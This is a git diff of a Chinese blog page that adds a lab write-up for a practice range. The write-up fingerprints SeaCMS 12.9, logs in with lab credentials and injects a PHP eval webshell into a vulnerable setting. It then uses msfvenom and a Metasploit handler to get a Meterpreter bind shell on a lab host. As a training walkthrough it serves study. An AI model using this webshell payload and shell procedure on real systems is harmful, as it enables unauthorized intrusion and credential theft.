@@ -19,23 +19,31 @@
   <meta name="author" content="tuyi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="天地不仁，以万物为刍狗">
+    <meta name="description" content="开干题目：最终任务是获取管理员的密码，能做到吗？ 修改client配置，设置特定网段走vpn 12route-nopullroute 10.0.0.0 255.255.255.0 vpn_gateway  信息收集进入网址发现是seacms但是不知道是什么版本 找到版本网址http:&#x2F;&#x2F;10.0.0.68&#x2F;DATA&#x2F;ADMIN&#x2F;VER.TXT  版本是12.9，搜索一波历史漏洞 访问&#x2F;cslab进">
 <meta property="og:type" content="article">
-<meta property="og:title" content="123">
-<meta property="og:url" content="https://tuyiisxp.github.io/2025/03/24/123/">
+<meta property="og:title" content="cyberstrikelab-pt1">
+<meta property="og:url" content="https://tuyiisxp.github.io/2025/03/30/cyberstrikelab-pt1/">
 <meta property="og:site_name" content="tuyi的小站">
-<meta property="og:description" content="天地不仁，以万物为刍狗">
+<meta property="og:description" content="开干题目：最终任务是获取管理员的密码，能做到吗？ 修改client配置，设置特定网段走vpn 12route-nopullroute 10.0.0.0 255.255.255.0 vpn_gateway  信息收集进入网址发现是seacms但是不知道是什么版本 找到版本网址http:&#x2F;&#x2F;10.0.0.68&#x2F;DATA&#x2F;ADMIN&#x2F;VER.TXT  版本是12.9，搜索一波历史漏洞 访问&#x2F;cslab进">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-24T11:53:54.000Z">
-<meta property="article:modified_time" content="2025-03-24T11:53:54.466Z">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330134844810.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135241959.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135656100.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135906147.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330140221588.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330154457649.png">
+<meta property="article:published_time" content="2025-03-30T05:41:51.000Z">
+<meta property="article:modified_time" content="2025-03-30T07:45:01.539Z">
 <meta property="article:author" content="tuyi">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330134844810.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>123 - tuyi的小站</title>
+  <title>cyberstrikelab-pt1 - tuyi的小站</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="123"></span>
+            <span id="subtitle" data-typed-text="cyberstrikelab-pt1"></span>
           
         </div>
 
@@ -218,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-24 19:53" pubdate>
-          2025年3月24日 晚上
+        <time datetime="2025-03-30 13:41" pubdate>
+          2025年3月30日 下午
         </time>
       </span>
     
@@ -230,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          197 字
         
       </span>
     
@@ -241,7 +249,7 @@
         
         
         
-          1 分钟
+          2 分钟
         
       </span>
     
@@ -278,12 +286,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">123</h1>
+            <h1 id="seo-header">cyberstrikelab-pt1</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年3月24日 晚上
+                    本文最后更新于 2025年3月30日 下午
                   
                 
               </p>
@@ -291,7 +299,36 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h1><p><strong>题目</strong>：最终任务是获取管理员的密码，能做到吗？</p>
+<p>修改<code>client</code>配置，设置特定网段走<code>vpn</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span>-nopull<br><span class="hljs-attribute">route</span> <span class="hljs-number">10.0.0.0</span> <span class="hljs-number">255.255.255.0</span> vpn_gateway<br></code></pre></td></tr></table></figure>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>进入网址发现是<code>seacms</code>但是不知道是什么版本</p>
+<p>找到版本网址<code>http://10.0.0.68/DATA/ADMIN/VER.TXT</code></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330134844810.png" srcset="/img/loading.gif" lazyload alt="image-20250330134844810"></p>
+<p>版本是12.9，搜索一波历史漏洞</p>
+<p>访问<code>/cslab</code>进入登录页面</p>
+<p>使用<code>cslab:cslab</code>进入</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135241959.png" srcset="/img/loading.gif" lazyload alt="image-20250330135241959"></p>
+<p>发现</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135656100.png" srcset="/img/loading.gif" lazyload alt="image-20250330135656100"></p>
+<p>与漏洞重合，尝试写马</p>
+<p>拼接一个木马进去</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;;<span class="hljs-keyword">@eval</span>($_POST[cmd]);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135906147.png" srcset="/img/loading.gif" lazyload alt="image-20250330135906147"></p>
+<p>虚拟机蚁剑连接(记得NAT模式)</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330140221588.png" srcset="/img/loading.gif" lazyload alt="image-20250330140221588"></p>
+<p>找到第一个</p>
+<p>第二关是administrator用户的ntmlhash值(居然不是密码🤣)</p>
+<p>使用msf生成正向连接木马在运行木马</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/bind_tcp <span class="hljs-attribute">LHOST</span>=0.0.0.0 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; shell.exe <br></code></pre></td></tr></table></figure>
+
+<p>在拿shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br> <br>use exploit/multi/handler<br> <br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br> <br><span class="hljs-built_in">set</span> rhost 10.0.0.68<br> <br><span class="hljs-built_in">set</span> lport 4444<br> <br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330154457649.png" srcset="/img/loading.gif" lazyload alt="image-20250330154457649"></p>
+
                 
               </div>
             
@@ -299,6 +336,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/cyberstrikelab/" class="category-chain-item">cyberstrikelab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
+      
+    </div>
   
 </div>
 
@@ -308,8 +373,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>123</div>
-      <div>https://tuyiisxp.github.io/2025/03/24/123/</div>
+      <div>cyberstrikelab-pt1</div>
+      <div>https://tuyiisxp.github.io/2025/03/30/cyberstrikelab-pt1/</div>
     </div>
     <div class="license-meta">
       
@@ -321,13 +386,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月24日</div>
+          <div>2025年3月30日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年3月24日</div>
+          <div>2025年3月30日</div>
         </div>
       
       
@@ -358,12 +423,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2025/04/03/cyberstrikelab-lab2/" title="cyberstrikelab_lab2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">cyberstrikelab_lab2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/03/24/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9AGithubPage/" title="域名绑定GithubPage">
-                        <span class="hidden-mobile">域名绑定GithubPage</span>
+                      <a href="/2025/03/30/cyberstrikelab-lab1/" title="cyberstrikelab_lab1">
+                        <span class="hidden-mobile">cyberstrikelab_lab1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
